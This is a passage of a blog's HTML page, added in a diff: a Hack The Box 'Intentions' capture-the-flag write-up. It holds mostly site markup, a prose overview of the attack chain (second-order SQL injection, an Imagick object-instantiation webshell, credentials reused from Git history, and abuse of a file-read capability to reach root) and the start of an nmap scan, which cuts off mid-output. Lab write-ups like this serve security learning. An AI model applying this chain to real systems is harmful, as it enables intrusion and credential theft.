@@ -1,0 +1,1781 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="rgb(255,255,255)" />
+  
+  <title>HTB Intentions &middot; Abraxas</title>
+    <meta name="title" content="HTB Intentions &middot; Abraxas" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.017a29273e0d1e39f8792cba62098ea8e1c922fd373503ba94b73dcab44dea79.css"
+    integrity="sha256-AXopJz4NHjn4eSy6YgmOqOHJIv03NQO6lLc9yrRN6nk="
+  />
+  
+    
+    
+    
+  
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bb487ad6073790cb02c354ee8c5f8822c42c5513e10bf7a86bbe8f82118cd1fc.js"
+      integrity="sha256-u0h61gc3kMsCw1TujF&#43;IIsQsVRPhC/eoa76PghGM0fw="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there&rsquo;s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website&rsquo;s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/htb-intentions/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+<link rel="manifest" href="/site.webmanifest" />
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/htb-intentions/">
+  <meta property="og:site_name" content="Abraxas">
+  <meta property="og:title" content="HTB Intentions">
+  <meta property="og:description" content="Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there’s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website’s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-10-17T11:12:07+05:30">
+    <meta property="article:modified_time" content="2023-10-17T11:12:07+05:30">
+    <meta property="article:tag" content="Htb-Hard">
+    <meta property="article:tag" content="SQLi">
+    <meta property="article:tag" content="Second-Order-SQLi">
+    <meta property="article:tag" content="PHP Arbitrary Object Instantiation">
+    <meta property="article:tag" content="Git">
+    <meta property="article:tag" content="Bruteforcing-Hashes">
+    <meta property="og:image" content="//localhost:1313/blog/htb-intentions/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/blog/htb-intentions/cover.png">
+  <meta name="twitter:title" content="HTB Intentions">
+  <meta name="twitter:description" content="Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there’s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website’s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "HTB Intentions",
+    "headline": "HTB Intentions",
+    
+    "abstract": "Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there\u0026rsquo;s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website\u0026rsquo;s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/htb-intentions\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Abraxas"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-10-17T11:12:07\u002b05:30",
+    "datePublished": "2023-10-17T11:12:07\u002b05:30",
+    
+    "dateModified": "2023-10-17T11:12:07\u002b05:30",
+    
+    "keywords": ["htb-hard","SQLi","second-order-SQLi","PHP Arbitrary Object Instantiation","git","bruteforcing-hashes","capabilities","cap_dac_read_search"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3675"
+  }
+  </script>
+
+
+  
+  <meta name="author" content="Abraxas" />
+  
+    
+      <link href="mailto:abr4xa5@proton.me" rel="me" />
+    
+      <link href="https://abraxas.pages.dev/" rel="me" />
+    
+      <link href="https://discordapp.com/users/703653879375724657" rel="me" />
+    
+      <link href="https://github.com/AbraXa5" rel="me" />
+    
+      <link href="https://infosec.exchange/@Abraxas" rel="me" />
+    
+      <link href="https://twitter.com/Abr4Xa5_" rel="me" />
+    
+      <link href="/blog/index.xml" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 print:hidden sm:py-10 dark:text-neutral">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Abraxas</a
+  >
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
+        >
+          <ul
+            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span></span
+              >
+            </li>
+            
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/blog/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Blog</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/categories/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Categories</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/tags/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Tags</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/about-me/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About Me</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    <button
+                      id="appearance-switcher-1"
+                      type="button"
+                      aria-label="appearance switcher"
+                    >
+                      <span
+                        class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                        title="Switch to dark appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                      <span
+                        class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                        title="Switch to light appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                    </button>
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    
+                      <button
+                        id="search-button-1"
+                        title="Search (/)"
+                      >
+                        
+                          <span
+                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </button>
+                    
+                  
+                </li>
+              
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="hidden list-none flex-row text-end sm:flex">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/blog/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/about-me/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About Me</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                <button
+                  id="appearance-switcher-2"
+                  type="button"
+                  aria-label="appearance switcher"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                    title="Switch to dark appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                  <span
+                    class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                    title="Switch to light appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                </button>
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                
+                  <button
+                    id="search-button-2"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 print:hidden dark:text-neutral-400">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Abraxas</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/htb-intentions/"
+      >HTB Intentions</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Intentions
+      </h1>
+      
+        <div class="mb-12 mt-8 text-base text-neutral-500 print:hidden dark:text-neutral-400">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-10-17 11:12:07 &#43;0530 IST">17 October 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/AbraXa5/personal-blog/tree/main/content/blog/htb-intentions/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+      
+        
+          
+            <a
+              href="/categories/htb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HTB</a
+            >
+          
+            <a
+              href="/categories/linux/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Linux</a
+            >
+          
+        
+      
+        
+          
+            <a
+              href="/tags/htb-hard/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Htb-Hard</a
+            >
+          
+            <a
+              href="/tags/sqli/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >SQLi</a
+            >
+          
+            <a
+              href="/tags/second-order-sqli/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Second-Order-SQLi</a
+            >
+          
+            <a
+              href="/tags/php-arbitrary-object-instantiation/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >PHP Arbitrary Object Instantiation</a
+            >
+          
+            <a
+              href="/tags/git/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Git</a
+            >
+          
+            <a
+              href="/tags/bruteforcing-hashes/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Bruteforcing-Hashes</a
+            >
+          
+            <a
+              href="/tags/capabilities/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Capabilities</a
+            >
+          
+            <a
+              href="/tags/cap_dac_read_search/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Cap_dac_read_search</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 -mt-4 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="/blog/htb-intentions/cover_hu719acdc6bad4c9a317d73d07a9baa046_81961_300x300_resize_q75_h2_box_3.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="300"
+        height="300"
+        class="mb-6 -mt-4 rounded-md"
+        
+        
+        
+          src="/blog/htb-intentions/cover.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 print:hidden lg:sticky lg:top-10">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#port-80---http">port 80 - HTTP</a>
+          <ul>
+            <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#shell-as-greg">Shell as greg</a></li>
+    <li><a href="#privilege-escalation-to-root">Privilege Escalation to root</a>
+      <ul>
+        <li><a href="#brute-force-automation-script">Brute-force automation script</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h1 id="htb-intentions" class="relative group">HTB Intentions <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#htb-intentions" aria-label="Anchor">#</a></span></h1><h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><hr>
+<blockquote>
+<p>Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there&rsquo;s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website&rsquo;s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the <code>CAP_DAC_READ_SEARCH</code> capability. This capability can be exploited to read files as the root user.</p>
+</blockquote>
+<hr>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="open-ports" class="relative group">Open Ports <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#open-ports" aria-label="Anchor">#</a></span></h3><p>Found two open ports</p>
+<ul>
+<li>port 22 → SSH</li>
+<li>port 80 → HTTP server</li>
+</ul>
+<p>The port 4444 also seems to be open, but that looks like a false positive</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p22,80,4444 -sV -sC -T4 -Pn -oA 10.10.11.220 10.10.11.220
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-12 19:40 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.220
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.060s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
